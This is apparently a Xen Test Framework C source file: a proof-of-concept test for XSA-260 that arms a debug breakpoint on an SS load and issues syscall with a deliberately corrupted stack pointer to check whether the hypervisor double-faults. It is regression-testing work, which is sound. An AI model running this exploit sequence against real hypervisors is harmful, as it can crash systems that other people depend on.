/**
 * @file tests/xsa-260/main.c
 * @ref test-xsa-260
 *
 * @page test-xsa-260 XSA-260
 *
 * Advisory: [XSA-260](https://xenbits.xen.org/xsa/advisory-260.html)
 *
 * The `mov` and `pop` instructions, when encoded with an @%ss destination
 * register, set the `movss` shadow in hardware, which prevents
 * interrupts/exceptions from being delivered until the following instruction
 * boundary.  This is intended to allow adjacent updates to @%ss and @%esp to
 * occur atomically WRT asynchronous uses of the stack.
 *
 * @#DB exceptions differ in whether they are discarded or deferred, and
 * breakpoint exceptions triggered by the `mov/pop` instructions themselves
 * are deferred until the end of the subsequent instruction.  If the
 * subsequent instruction transitions into supervisor mode, the @#DB is
 * delivered after the privilege change.
 *
 * The `syscall` instruction doesn't switch stack itself, which is open to
 * (ab)use from guest context if Xen doesn't arrange for a stack switch on
 * @#DB via other means (IST entry for 64bit, Task Gate for 32bit).
 *
 * This test arranges for such an exploit attempt, but deliberately corrupts
 * the stack point (by inverting the top bit) to increase the chances of a
 * crash.  The 64bit test will reliably @#DF a vulnerable OS (trying to use a
 * non-canonical stack pointer), while the 32bit test (subject to availability
 * of the instruction) will cause a @#DF if @%esp ends up on an unmapped
 * address.
 *
 * @see tests/xsa-260/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-260 PoC";

static unsigned int __user_data user_ss = __USER_DS;

static void undo_stack(struct cpu_regs *regs)
{
    /* This had better be a user frame, so ->_sp is safe in 32bit builds. */
    if ( IS_DEFINED(CONFIG_32BIT) )
        ASSERT((regs->cs & 3) == 3);

    regs->_sp = regs->bx;
}

void do_syscall(struct cpu_regs *regs)
{
    printk("  Entered XTF via syscall\n");

    undo_stack(regs);

    if ( IS_DEFINED(CONFIG_32BIT) &&
         regs->cs == 0xe023 && regs->_ss == 0xe02b )
    {
        xtf_warning("Warning: Fixing up Xen's 32bit syscall selector bug\n");
        regs->cs  = __USER_CS;
        regs->_ss = __USER_DS;
    }
}

static bool ex_check_UD(struct cpu_regs *regs, const struct extable_entry *ex)
{
    if ( regs->entry_vector == X86_EXC_UD )
    {
        printk("  Hit #UD for syscall (not vulnerable)\n");

        undo_stack(regs);
        regs->ip = ex->fixup;

        return true;
    }

    return false;
}

static void __user_text user_syscall(void)
{
    asm volatile (/* Stash the stack pointer before clobbering it. */
                  "mov %%" _ASM_SP ", %%" _ASM_BX ";"

                  "btc $%c[bit], %%" _ASM_SP ";"
                  "mov %[ss], %%ss;"
                  "1: syscall; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[hnd])
                  :
                  : [bit] "i" (BITS_PER_LONG - 1),
                    [ss]  "m" (user_ss),
                    [hnd] "p" (ex_check_UD)
#ifdef __x86_64__
                  : "rbx", "rcx", "r11"
#else
                  : "ebx", "ecx", "edx"
#endif
        );
}

static void __user_text user_syscall_compat(void)
{
    asm volatile (/* Stash the stack pointer before clobbering it. */
                  "mov %%" _ASM_SP ", %%" _ASM_BX ";"

                  /* Drop to a 32bit compat code segment. */
                  "push $%c[cs32];"
                  "push $1f;"
                  "lretq; 1:"
                  ".code32;"

                  /* Invert the top bit of the stack pointer. */
                  "btc $31, %%esp;"

                  /*
                   * Launch the attack.  Manually encode the memory reference
                   * to prevent the toolchain trying to write out a
                   * rip-relative reference in 32bit code.
                   */
                  "mov (%k[ss_ptr]), %%ss;"
                  "1: syscall; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[hnd])

                  /* Return to 64bit mode. */
                  "ljmpl $%c[cs64], $1f; 1:"
                  ".code64;"
                  :
                  : [cs32]   "i" (__USER_CS32),
                    [ss_ptr] "R" (&user_ss),
                    [cs64]   "i" (__USER_CS),
                    [hnd] "p" (ex_check_UD)
#ifdef __x86_64__
                  : "rbx", "rcx", "r11"
#else
                  : "ebx", "ecx", "edx"
#endif
        );
}

void test_main(void)
{
    unsigned int ss = read_ss();

    write_dr0(&ss);

    unsigned long dr7 = DR7_SYM(0, L, G, RW, 32) | X86_DR7_LE | X86_DR7_GE;

    /* Double %dr7 write to work around Xen's latching bug. */
    write_dr7(dr7);
    write_dr7(dr7);

    exinfo_t fault = 0, exp = EXINFO_SYM(DB, 0);

    /* Sanity check that breakpoints are working. */
    asm volatile ("mov %[ss], %%ss; nop; 1:"
                  _ASM_EXTABLE_HANDLER(1b, 1b, %P[rec])
                  : "+a" (fault)
                  : [ss] "m" (ss), [rec] "p" (ex_record_fault_eax));

    if ( fault != exp )
        return xtf_error("Error checking breakpoint\n"
                         "  Expected %#x %pe, got %#x %pe\n",
                         exp, _p(exp), fault, _p(fault));

    /* Prime the user code for its exploit attempt. */
    write_dr0(&user_ss);

    printk("Testing native syscall\n");
    exec_user_void(user_syscall);

    /* For 64bit guests, try a compat syscall as well. */
    if ( IS_DEFINED(CONFIG_64BIT) )
    {
        printk("Testing compat syscall\n");
        exec_user_void(user_syscall_compat);
    }

    write_dr7(0);

    xtf_success("Success: Not vulnerable to XSA-260\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
